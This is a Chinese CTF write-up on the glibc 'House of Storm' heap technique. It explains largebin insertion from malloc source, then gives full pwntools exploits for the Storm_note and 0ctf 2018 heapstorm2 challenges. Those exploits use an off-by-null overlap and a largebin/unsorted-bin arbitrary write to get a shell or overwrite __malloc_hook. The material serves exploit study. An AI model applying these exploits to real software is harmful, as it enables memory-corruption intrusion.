
---
title: House_of_Storm
date: 2019-05-07 22:14:30
tags: House_Of_Storm
layout: post
---
Seize it, control it, and exploit it. Welcome to the House of Storm.
<!--more-->
# START

西湖论剑初赛的时候遇到了storm感觉自己太菜了 乘机做了一下出处:0ctf2018_heapstorm2.关于large unsorted 方面的题目还是做的太少了.
题目出得太棒了感谢出题人,感觉最后的large bin + unsorted 链入控制任意已知地址玩得太秀了.
乘着这次机会读挺久源码...理解的确更加深入了.
感谢[veritas501][5]对largebin的分享,感谢[sakura][6]关于0ctf2018_heapstorm2的分析非常详细,感谢[keenan][7]关于stormnote的exp
(看完不理解调一遍就理解了),感谢seebug.提供了已经总结得不错的减少了我看源码的时间[学习资料][1]

# 前置技能
## mallopt
`百度百科`
* int mallopt(int param,int value)

param 的取值可以为M_CHECK_ACTION、M_MMAP_MAX、M_MMAP_THRESHOLD、M_MXFAST（从glibc2.3起）、M_PERTURB（从glibc2.4起）、M_TOP_PAD、M_TRIM_THRESHOLD
```
M_MXFAST:定义使用fastbins的内存请求大小的上限，小于该阈值的小块内存请求将不会使用fastbins获得内存，其缺省值为64。
```
例如`mallopt(1,0)`.关闭fastbin
## off_by_one
相关介绍我在上篇博客中已有提及
[LINK][2]
## LARGEBIN
探索动手过程可能比较冗长无趣可以直接跳到下一节
`large chunk head`结构
```python
-------------------------
|pre_size   |size       |
|FD         |BK         |
|fd_nextsize|bk_nextsize|
-------------------------
```
和一般的`bins`区别的地方是多了两个指针`fd_nextsize`,`bk_nextsize`
先来看看larginbin放入条件:
```
遍历 unsorted bin 中的 chunk, 如果请求的 chunk 是一个 small chunk, 且 unsorted bin 只有一个 chunk, 并且这个 chunk 在上次分配时被使用过(也就是 last_remainder), 并且 chunk 的大小大于 (分配的大小 + MINSIZE), 这种情况下就直接将该 chunk 进行切割, 分配结束, 否则继续遍历, 如果发现一个 unsorted bin 的 size 恰好等于需要分配的 size, 命中缓存, 分配结束, 否则将根据 chunk 的空间大小将其放入对应的 small bins 或是 large bins 中, 遍历完成后, 转入下一步. 
```
malloc.c
```c
#define NSMALLBINS         64
#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT
#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ)
#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)
#define in_smallbin_range(sz)  \
  ((unsigned long) (sz) < (unsigned long) MIN_LARGE_SIZE)
```
看着太麻烦...直接动手试试.(amd64)
main.c
```c
//gcc main.c -o main
#include<stdio.h>
int main()
{
	char *A=malloc(0x3f8);
	malloc(1);
	char *B=malloc(0x408);
	malloc(1);
	char *C=malloc(0x3e8);
	malloc(1);
	free(A);
	free(B);
	free(C);
	malloc(0x1000);
}
```
`$gdb main`
log
```c
n132>>> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x603c70 (size : 0x1f390) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x3f0)  smallbin[61]: 0x602850
         largebin[ 0]: 0x602420 (size : 0x410) <--> 0x602000 (size : 0x400)
```

可以看出当amd64下`MIN_LARGE_SIZE=0x400`

largebin因为一个bin[x]可以存放不同`size`的`chunk`所以维持了两个链表
源码中是如何确定idx的
```c
#define largebin_index_64(sz)                                                \
  (((((unsigned long) (sz)) >> 6) <= 48) ?  48 + (((unsigned long) (sz)) >> 6) :\
   ((((unsigned long) (sz)) >> 9) <= 20) ?  91 + (((unsigned long) (sz)) >> 9) :\
   ((((unsigned long) (sz)) >> 12) <= 10) ? 110 + (((unsigned long) (sz)) >> 12) :\
   ((((unsigned long) (sz)) >> 15) <= 4) ? 119 + (((unsigned long) (sz)) >> 15) :\
   ((((unsigned long) (sz)) >> 18) <= 2) ? 124 + (((unsigned long) (sz)) >> 18) :\
   126)
#define largebin_index(sz) \
  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \
   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \
   : largebin_index_32 (sz))
```

因为
```c
2^6=0x40
2^9=0x200
2^12=0x1000
2^15=0x8000
...
```
通过测试
可以看出`largin bin size` 和 `idx`有如下对应
```python
|size           |idx                      |
-------------------------------------------
|0x400~0xC40    |(size-0x400)//0x40+64    |
|---------------|-------------------------|
|0xC40~0xe00    |97                       |
|---------------|-------------------------|
|0xe00~0x2a00   |(size-0xe00)//0x200+97   |
|---------------|-------------------------|
|0x2a00~0x3000  |113                      |
|---------------|-------------------------|
|0x3000~0x10000 |(size-0x3000)//0x1000+113|
|---------------|-------------------------|
|...            |...                      |
|---------------|-------------------------|
```
调试log
```s
n132>>> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x617ca0 (size : 0xd360) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
         largebin[32]: 0x607060 (size : 0xc10)
         largebin[47]: 0x602000 (size : 0x2810) <--> 0x604830 (size : 0x2810)
n132>>> p main_arena.bins[220]
$10 = (mchunkptr) 0x602000
n132>>> p main_arena.bins[221]
$11 = (mchunkptr) 0x604830
```
大致了解了idx和size之后,了解`largin bin`某一`idx`下链入的规则
这里偷一下`veritas501`的测试代码
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(void){
	void * A = malloc(0x430-0x10);
	malloc(0x10);
	void * B = malloc(0x430-0x10);
	malloc(0x10);
	void * C = malloc(0x420-0x10);
	malloc(0x10);
	void * D = malloc(0x420-0x10);
	malloc(0x10);
	void * E = malloc(0x400-0x10);
	malloc(0x10);


	free(A);
	free(B);
	free(C);
	free(D);
	free(E);

	malloc(0x1000);
	
	return 0;
```
利用`gdb`调试可以对larginbin的双向循环链表有更多发现
这里建议不太了解的师傅调试一下.我简单地贴上free之后两个链表的状态
`··fd&bk··`
```python
ARENA<===>A<===>B===>C<===>D<===>E
^                                ^
|                                |
==================================
```
`··fd_nextsize&bk_nextsize··`
```python
A<===>C<===>E
^           ^
|           |
=============
```
盗用`veritas501`的总结

* 按照大小从大到小排序,若大小相同,按照free时间排序
* 若干个大小相同的堆块,只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块,后面的堆块的fd_nextsize和bk_nextsize均为0
* size最大的chunk的bk_nextsize指向最小的chunk; size最小的chunk的fd_nextsize指向最大的chunk
## LARGE BIN INSERT
在`malloc`过程中有这样一个过程
```
...
遍历 unsorted bin 中的 chunk, 如果请求的 chunk 是一个 small chunk, 且 unsorted bin 只有一个 chunk, 并且这个 chunk 在上次分配时被使用过(也就是 last_remainder), 并且 chunk 的大小大于 (分配的大小 + MINSIZE), 这种情况下就直接将该 chunk 进行切割, 分配结束, 否则继续遍历, 如果发现一个 unsorted bin 的 size 恰好等于需要分配的 size, 命中缓存, 分配结束, 否则将根据 chunk 的空间大小将其放入对应的 small bins 或是 large bins 中, 遍历完成后, 转入下一步. 
...
```
//unsorted bin 未满足 将其插入 largin bin 实现的部分源码
[source][4]//link里的libc版本比较新..有些检查
我下面贴的是2.23的
```c
else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
              //get idx & set bck,fwd
              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
                  //如果大小小于bin[idx]里最小的那就直接放到末尾
                  if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else//找适合的位置
                    {
                      assert ((fwd->size & NON_MAIN_ARENA) == 0);
                      //遍历结束找到位置
                      while ((unsigned long) size < fwd->size)
                        {
                          fwd = fwd->fd_nextsize;
                          assert ((fwd->size & NON_MAIN_ARENA) == 0);
                        }
                      //如果已经存在了该大小的chunk的链入方式
                      if ((unsigned long) size == (unsigned long) fwd->size)
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }
          //fd bk 维护
          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;

#define MAX_ITERS       10000
          if (++iters >= MAX_ITERS)
            break;
        }

```
主要的链入操作就是
```c
victim->fd_nextsize = fwd;
victim->bk_nextsize = fwd->bk_nextsize;
fwd->bk_nextsize = victim;
victim->bk_nextsize->fd_nextsize = victim;

victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;
```

* 如果我们拥有操作已有`largebin`的`bk`和`bk_nextsize`能力以及控制`unsortedbin`的`bk`的话 我们通过可以将任意地址链入`largebin`从而获得任意地址写

简要流程
```c
set unsortedbin size bk
set largebin size bk bk_nextsize
malloc 0x48
```
在malloc 0x48的发生了

* 检测是否<maxfast 如果是那么fastbin内是否有合适的chunk
* 是否smallbin里有合适的//没有,下一个
* 检测unsortedbin//这里我们通过让`last_remainder`!=unsorted
* 将unsorted bin 中chunk放入largebin 或者smallbin
* 原有的unsortedbin被放入largebin
* malloc一个适合size获得链入的位置
具体过程在debug_log中有演示.
原理是对链表的维护操作没有检查.fwd->bk_nextsize->fd_nextsize是否指向了一个意图进入的`fakechunk`
```arm
victim->fd_nextsize = fwd;
victim->bk_nextsize = fwd->bk_nextsize;
fwd->bk_nextsize = victim;
victim->bk_nextsize->fd_nextsize = victim;
```
在新的libc中添加了新的检查
```arm
victim->fd_nextsize = fwd;
victim->bk_nextsize = fwd->bk_nextsize;
if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
fwd->bk_nextsize = victim;
victim->bk_nextsize->fd_nextsize = victim;
```
# Storm_note

[binary][3]

## Analysis
全保护
```s
➜  Storm_note checksec Storm_note 
[*] '/home/n132/Desktop/Storm_note/Storm_note'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```
存在四个功能和一个隐藏功能
* add
* edit
* free
* exit
* 666
`add,free,exit`比较常规不多介绍.
`edit`内有个比较明显的`null_byte_off`.
```arm
if ( v1 >= 0 && v1 <= 15 && note[v1] )
  {
    puts("Content: ");
    v2 = read(0, note[v1], (signed int)note_size[v1]);
    *((_BYTE *)note[v1] + v2) = 0;
    puts("Done");
  }
```
`666`功能表示如果你可以任意地址写那就给你个shell...
```arm
if ( !memcmp(&buf, (const void *)0xABCD0100LL, 0x30uLL) )
    system("/bin/sh");
```

## 利用
* off_by_one:shrink to overlap
* storm to edit 0xabcd0100
思路很简单..很直接 
storm真的是很巧妙.
## DEBUG_LOG
[off_by_one][2]shrink在上文中已经介绍.主要调`storm`过程.
我把`libc`换成了我自己编译的`libc`有符号看得比较清楚
我们首先看看完成对`unsortedbin`,`largebin`布局之后的堆情况.
```arm
n132>>> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x56315237ba80 (size : 0x20580) 
       last_remainder: 0x56315237b0f0 (size : 0x4a0) 
            unsortbin: 0x56315237b0b0 (doubly linked list corruption 0x56315237b0b0 != 0x0 and 0x56315237b0b0 is broken)
         largebin[ 2]: 0x56315237b0f0 (doubly linked list corruption 0x56315237b0f0 != 0x0 and 0x56315237b0f0 is broken)
n132>>> x/8gx 0x56315237b0b0
0x56315237b0b0:	0x0000000000000000	0x00000000000004b1
0x56315237b0c0:	0x0000000000000000	0x00000000abcd00e0
0x56315237b0d0:	0x000000000000000a	0x0000000000000020
0x56315237b0e0:	0x0000000000000021	0x0000000000000021
n132>>> 
0x56315237b0f0:	0x000000000000000a	0x00000000000004a1
0x56315237b100:	0x0000000000000000	0x00000000abcd00e8
0x56315237b110:	0x0000000000000000	0x00000000abcd00c3
0x56315237b120:	0x000000000000000a	0x0000000000000000
```
在链入过程中不会检查`unsortedbin`或者`largebin`的下一个`chunk`的`pre_size`
所以只需要设置好
* unsortedbin:size,bk
* largebin:size,bk,bk_nextsize
```python
aim_address=0xabcd0100
unsortedchunk_size=0x4b1
largechunk_size=0x4a1
unsortedchunk_bk=aim_address-0x20
bk=aim_address-0x20+8
bk_nextsize=aim_address-0x20-0x18-5
```
这样做的目的是为了把`0xabcd0100`链入largebin.几个值的设置完成了对`fakechunk` 的`size,fd,bk`的改写,非常优雅非常美非常精妙.想出来的师傅非常强
//想明白了之后对这波操作简直叹为观止.

继续跟着程序走:`b _int_malloc`c进入`_int_malloc`.先是一堆检查.
* 检测是否小于maxfast

` ► 3368   if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))`
因为maxfast被重置了所以显然大于.
* 检测smallbin中是否可以满足

```c
   3405   if (in_smallbin_range (nb))
   3406     {
   3407       idx = smallbin_index (nb);
   3408       bin = bin_at (av, idx);
   3409 
 ► 3410       if ((victim = last (bin)) != bin)
   3411         {
   3412           if (victim == 0) /* initialization check */
   3413             malloc_consolidate (av);
   3414           else
...
```
没有.下一个

* 去unsortedbin中寻找合适人选
` ► 3489               victim == av->last_remainder &&`
但是因为发现和`last_remainder`要将`unsortedchunk`放入`smallbin`or`largebin`
* 对将放入的chunk进行些检查
```arm
   3473           if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
 ► 3474               || __builtin_expect (victim->size > av->system_mem, 0))
   3475             malloc_printerr (check_action, "malloc(): memory corruption",
   3476                              chunk2mem (victim), av);
   3477           size = chunksize (victim);

```
* 此时`unsorted_size`早已被我们控制
```python
n132>>> p size
$2 = 0x4b0
```
* 所以将会放入`largebin`
```arm
   3541             {
 ► 3542               victim_index = largebin_index (size);
   3543               bck = bin_at (av, victim_index);
   3544               fwd = bck->fd;
   3545 
   3546               /* maintain large bins in sorted order */
   3547               if (fwd != bck)
```
* 由于大小大于目前largechunk所以会被链入到头部
```s
n132>>> p bck
$5 = (mchunkptr) 0x7f51a0901f88 <main_arena+1128>
n132>>> p fwd
$6 = (mchunkptr) 0x5641a7e080f0
n132>>> p victim
$7 = (mchunkptr) 0x5641a7e080b0
```
* 链入操作
```arm
   3574                       else
   3575                         {
   3576                           victim->fd_nextsize = fwd;
 ► 3577                           victim->bk_nextsize = fwd->bk_nextsize;
   3578                           fwd->bk_nextsize = victim;
   3579                           victim->bk_nextsize->fd_nextsize = victim;
   3580                         }
   3581                       bck = fwd->bk;
```
* 此时victim是unsortedbin

先是对`victim`的`fd_nextsize`和`bk_nextsize`的赋值
```arm
n132>>> p victim->bk_nextsize 
$14 = (struct malloc_chunk *) 0xabcd00c3
n132>>> p victim->fd_nextsize 
$15 = (struct malloc_chunk *) 0x5641a7e080f0
```
* 然后对fwd(0x5641a7e080f0)的bk_nextsize赋值为victim(0x5641a7e080b0)
```arm
n132>>> p fwd
$18 = (mchunkptr) 0x5641a7e080f0
n132>>> p victim
$19 = (mchunkptr) 0x5641a7e080b0
n132>>> p fwd->bk_nextsize 
$20 = (struct malloc_chunk *) 0x5641a7e080b0
```
* then 重点来了,设置fwd的bk_nextsize.
`victim->bk_nextsize->fd_nextsize = victim;`
此时`victim->bk_nextsize=0xabcd00c3`也就是`fakechunk`
其`fd_nextsize`也就是`0xabcd00c3+0x20`被设置为`victim=0x00005641a7e080b0`用来充当`fake_chunk`的`size`

* 之后完成对fd&bk链表的维护
```arm
 ► 3589           victim->bk = bck;
   3590           victim->fd = fwd;
   3591           fwd->bk = victim;
   3592           bck->fd = victim;
```
* 对fakechunk的入链已经完成
```arm
n132>>> x/8gx 0xabcd00e0
0xabcd00e0:	0x41a7e080b0000000	0x0000000000000056
0xabcd00f0:	0x00007f51a0901b78	0x00005641a7e080b0
```
* 接下来将其获得
有个检查此处检查`mmapped`位所以要求写入的`heap_address`最高非0位为偶数`/x56`
```
 ► 3240   assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||
   3241           av == arena_for_chunk (mem2chunk (mem)));
```
* 实现任意写.tql


## exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(size):
	cmd(1)
	p.sendlineafter(" ?\n",str(size))
def free(idx):
	cmd(3)
	p.sendlineafter(" ?\n",str(idx))
def edit(idx,c):
	cmd(2)
	p.sendlineafter(" ?\n",str(idx))
	p.sendlineafter(": \n",str(c))
p=process("./Storm_note")
#context.log_level='debug'
add(0x500)#0
add(0x88)#1
add(0x18)#2
free(0)
add(0x18)#0
edit(0,"A"*0x18)
add(0x88)#3
add(0x88)#4
free(3)
free(1)

add(0x2d8)#1
add(0x78)#3
add(0x48)#5
add(0x4a9)#6
# now,start to build payload idx=4&5
aim=0x00000000abcd0100
bk=aim-0x20+8
bk_nextsize=aim-0x20-0x18-5
edit(4,p64(0)*7+p64(0x4a1)+p64(0)+p64(bk)+p64(0)+p64(bk_nextsize))#edit the head of LARGECHUNK
edit(5,p64(0)+p64(0x21)*7)
free(4)
edit(5,p64(0)+p64(0x4b1)+p64(0)+p64(aim-0x20))#edit the head & bk of UNSORTEDCHUNK
#gdb.attach(p,'')
# if heap != 0x56xxxxxxxx crashed
add(0x48)
edit(4,p64(0)*8+'\x00'*7)
cmd(666)
p.send("\x00"*0x30)
p.interactive()
```
# heapstorm
[binary][8]
house of storm 的起源,本该放在前面...但是我先做的StormNote所以在思路方面上题写得较为详细.这题只是叙述大概流程,感谢出题人.
## Analysis
依然全保护,提供的是`libc-2.24.so`
```
[*] '/home/n132/Desktop/heapstorm'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
题目一开始在地址`0x13370000`开辟空间并读入随机数至`0x13370800`并作初始化操作
存在:

* add
* edit
* free
* show*
其中`edit`会在末尾补上特定的`0xc`个字节
`show`功能在`*0x13370800`xor`*0x13370808`==`0x13377331`后开启

题目中`list[]`储存的地址与`size`为真实地址和随机数异或后的值.


## 漏洞分析.
主要的漏洞出现在`edit`功能中:`off_by_null`
```arm
  do_read(ptr, size);
  v3 = &ptr[size];
  *(_QWORD *)v3 = 'ROTSPAEH';
  *((_DWORD *)v3 + 2) = 'II_M';
  v3[12] = 0;        
```
## 利用
* 介于上题以详细叙述了`House of Storm`的攻击过程本题直接拿结果来用
* Off By one shrink ===>over lap
* House of Storm =====>get the control of 0x13370800
* set list[-1] to show & set list[0] to leak
* edit list[0] + edit list[n] to modify `__malloc_hook`
## exp
```python
from pwn import *
#context.log_level='debug'
def cmd(c):
	p.sendlineafter("and: ",str(c))
def add(size):
	cmd(1)
	p.sendlineafter("Size: ",str(size))
def edit(idx,size,c):
	cmd(2)
	p.sendlineafter("Index: ",str(idx))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Content: ",c)
def free(idx):
	cmd(3)
	p.sendlineafter("Index: ",str(idx))
def show(idx):
	cmd(4)
	p.sendlineafter("Index: ",str(idx))
p=process('./heapstorm',env={"LD_PRELOAD":"./libc-2.24.so"})
add(0x500)#0
add(0x88)#1
add(0x18)#2
free(0)
add(0x18)#0
edit(0,0x18-0xc,"A"*(0x18-0xc))
add(0x88)#3
add(0x88)#4
free(3)
free(1)
add(0x2d8)#1
add(0x78)#3
add(0x48)#5
aim=0x13370810
add(0x666)#6
edit(4,8*12,p64(0x4a1)*8+p64(0)+p64(aim-0x20+8)+p64(0)+p64(aim-0x20-0x18-5))
edit(5,0x10,p64(0)+p64(0x91))
free(4)
edit(5,0x20,p64(0)+p64(0x4b1)+p64(0)+p64(aim-0x20))

add(0x48)#4

edit(4,0x48-0xc,'\x00'*0x10+p64(0x13377331)+p64(0)+p64(0x13370840)+p64(0x100)+'\x00'*0xc)

show(0)
p.readuntil(": ")
p.read(0x20)
base=(u64(p.read(8))^0x13370800)-(0x00007fae63fa9b78-0x7fae63be5000)-(0x7f55e1876fe0-0x7f55e18a2000)
heap=u64(p.read(8))-0xf8
log.info(hex(base))
log.info(hex(heap))
#
gdb.attach(p,'')
libc=ELF("./libc-2.24.so")
libc.address=base
edit(0,0x88,p64(libc.sym['__malloc_hook'])+p64(0x100)+'\x00'*0x78)
one=0x3f35a+base
edit(2,0x14-0xc,p64(one))
#
add(0x100)
p.interactive()

# fill 0x13377331
```

# 参考&引用

```
[seebug]:https://paper.seebug.org/255/#5-last_remainder
[source]:https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_calloc
[veritas501]:https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/
[eternalsakura13]:http://eternalsakura13.com/2018/04/03/heapstorm2/
[keenan]:https://genowang.github.io/2019/04/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-SwampCTF-Pwn/#Storm-note
```
# 一个可以不看的小问题.
练习的时候发现一个很有趣的问题.后来经过很长时间的diff终于找出了问题所在..原因还是源码看少了.之前这句话的理解还是比较不完整

..遍历 unsorted bin 中的 chunk, 如果请求的 chunk 是一个 small chunk, 且 unsorted bin 只有一个 chunk, `并且这个 chunk 在上次分配时被使用过(也就是 last_remainder)`, 并且 chunk 的大小大于 (分配的大小 + MINSIZE), 这种情况下就直接将该 chunk 进行切割, 分配结束...

其中有个条件是`并且这个 chunk 在上次分配时被使用过`
code::
```c
 if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
```
也就是`victim == av->last_remainder`条件.
所以我们在构造`off_by_one&shrink`的时候要注意`last_remainder==aim unsorted bin`//可能我是地球上最后一个知道的😅

这里给出两个两个有趣的例子,有兴趣的师傅可以自己去玩玩看.有个奇怪的点是我自己编译的libc居然可以没有检查报错...没有深究...但是这个的确让我定位错误花了更多的时间😭

[binary][3]
### 1.py
```python
from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(size):
	cmd(1)
	p.sendlineafter(" ?\n",str(size))
def free(idx):
	cmd(3)
	p.sendlineafter(" ?\n",str(idx))
def edit(idx,c):
	cmd(2)
	p.sendlineafter(" ?\n",str(idx))
	p.sendlineafter(": \n",str(c))
p=process("./Storm_note")
context.log_level='debug'
add(0x18)#0
add(0x400-0x20)#1
add(0x88)#2
add(0x18)#3
free(0)
free(1)
add(0x18)#0
edit(0,"A"*0x18)
gdb.attach(p)
add(0x88)#1
add(0x88)#4
free(1)
free(2)
p.interactive()
```
### 2.py
```python
from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(size):
	cmd(1)
	p.sendlineafter(" ?\n",str(size))
def free(idx):
	cmd(3)
	p.sendlineafter(" ?\n",str(idx))
def edit(idx,c):
	cmd(2)
	p.sendlineafter(" ?\n",str(idx))
	p.sendlineafter(": \n",str(c))
p=process("./Storm_note")
context.log_level='debug'
add(0x18)#0
add(0x400-0x20)#1
add(0x88)#2
add(0x18)#3
free(1)
edit(0,"A"*0x18)
gdb.attach(p)
add(0x88)#1
add(0x88)#4
free(1)
free(2)
p.interactive()
```
## 改进
为了避免这个坑我改进了我一般构造`shrink`的方法
```python
add(0x400)#0
add(0x88)#1
add(0x18)#2
free(0)
add(0x18)#0
edit(0x18,"A"*0x18)
add(0x88)#3
add(0x88)#4
free(3)
free(1)
```
# STORM 总结
* libc版本有要求.目前不清楚反正最新的不行<=2.24是可以的主要看链入时有没有检查
* 可以控制unsorted chunk:size,bk
* 可以控制largechunk:size bk bk_nextsize
过程
```python
aim=0xdeadbeef0000
bk=aim-0x20+8
bk_nextsize=aim-0x20-0x18-5
edit(4,p64(0x4a1)+p64(0)+p64(bk)+p64(0)+p64(bk_nextsize))#edit the head of LARGECHUNK
edit(5,p64(0)+p64(0x4b1)+p64(0)+p64(aim-0x20))#edit the head & bk of UNSORTEDCHUNK
add(0x48)
```


[1]:https://paper.seebug.org/255/#5-last_remainder
[2]:https://n132.github.io/2019/04/11/Off-by-one/
[3]:https://github.com/n132/Watermalon/tree/master/westlake/Storm_note
[4]:https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_calloc
[5]:https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/
[6]:http://eternalsakura13.com/2018/04/03/heapstorm2/
[7]:https://genowang.github.io/2019/04/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-SwampCTF-Pwn/#Storm-note
[8]:https://github.com/n132/Watermalon/tree/master/0ctf_2018/heapstorm